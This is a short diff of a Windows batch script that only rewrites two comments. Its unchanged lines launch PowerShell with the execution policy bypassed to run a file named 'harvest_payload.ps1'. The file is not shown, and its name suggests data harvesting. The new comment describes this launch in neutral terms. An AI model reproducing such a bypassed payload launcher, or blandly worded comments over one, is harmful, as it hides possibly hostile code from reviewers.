@@ -58,7 +58,7 @@ if "%~1"=="/?" goto show_help
 goto run_script
 
 :: ## show_help
-:: Executes show_help functionality.
+:: Displays command-line usage instructions and available options.
 :show_help
 echo Usage: %~nx0 [OPTIONS]
 echo.
@@ -76,7 +76,7 @@ echo   --help, -h               Show this help text
 exit /b 0
 
 :: ## run_script
-:: Executes run_script functionality.
+:: Performs the run_script operation and updates component state.
 :run_script
 set "PS1_FILE=%SCRIPT_DIR%\harvest_payload.ps1"
 powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1_FILE%" %*
